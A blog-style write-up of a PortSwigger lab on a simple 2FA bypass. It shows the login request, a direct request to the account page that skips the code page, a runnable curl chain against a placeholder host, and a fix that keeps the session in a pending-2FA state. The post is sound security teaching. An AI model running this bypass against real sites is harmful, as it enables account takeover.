---
layout: post
title: "PortSwigger: 2FA Simple Bypass"
date: 2027-10-05 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, Authentication]
tags: [portswigger, authentication, 2fa, mfa, broken-authentication, account-takeover, cwe-287]
---

A second factor only helps if the server actually *enforces* it. This lab's login asks for a verification code after the password — but the code page is just a screen it redirects you to, not a checkpoint. The session is already trusted the moment the password is right, so you can walk straight past the code prompt. ([CWE-287](https://cwe.mitre.org/data/definitions/287.html), Improper Authentication.)

## Overview

The goal is to access `carlos`'s account. We have his credentials (`carlos:montoya`) — in the real world these come from a phish or a breach dump. The login is two steps: submit the password at `/login`, then enter the emailed code at `/login2`. We never need the code.

## The technique

The flaw is a missing session state. The server should keep the session "pending-2FA" — granting *zero* authenticated access — until a valid code is submitted. Instead, a correct password immediately upgrades the session to fully-authenticated, and `/login2` is merely the page it redirects you to. Because no protected route checks "did this session complete 2FA?", any authenticated page is reachable with the post-password cookie.

## Solution

**Step 1 — log in as carlos.** The server validates the password and trusts the session:

```
POST /login
username=carlos&password=montoya

→ 302 Location: /login2        (session is now trusted)
```

**Step 2 — skip the code page.** Instead of going to `/login2`, request the account page directly with the same session cookie:

```
GET /my-account

→ 200 OK
"Your username is: carlos"
```

We are logged in as carlos, with no code entered. The lab flips to **Solved** the instant `/my-account` loads.

The whole thing as one runnable chain (replace `TARGET` with the lab host):

```bash
curl -sk -c cookies.txt -b cookies.txt -X POST \
  "https://TARGET/login" -d 'username=carlos&password=montoya' && \
curl -sk -b cookies.txt "https://TARGET/my-account" | grep -i 'Your username is'
```

## Why it worked

The session jumps straight from "anonymous" to "fully authenticated" the instant the password passes — there is no intermediate "password OK, still waiting on the second factor" state. Since the 2FA page is only a UI redirect and not a server-side gate, every authenticated route is reachable without the code. A known password becomes a full account takeover, and the MFA is purely decorative.

## Fix / defense

Keep the session in a **pending-2FA** state that grants no authenticated access until a valid code is verified, and issue the real session token only *after* the code check passes:

```js
// vulnerable: session trusted on password alone
if (passwordOk(user, pass)) { session.user = user; return redirect('/login2'); }

// fixed: no authenticated access until the code is verified
if (passwordOk(user, pass)) { session.pending2fa = user; return redirect('/login2'); }
// only after verifyCode():  session.user = session.pending2fa; delete session.pending2fa;
```

Every protected endpoint should verify the 2FA-completed claim via middleware — never rely on the user "having been redirected" to the code page.
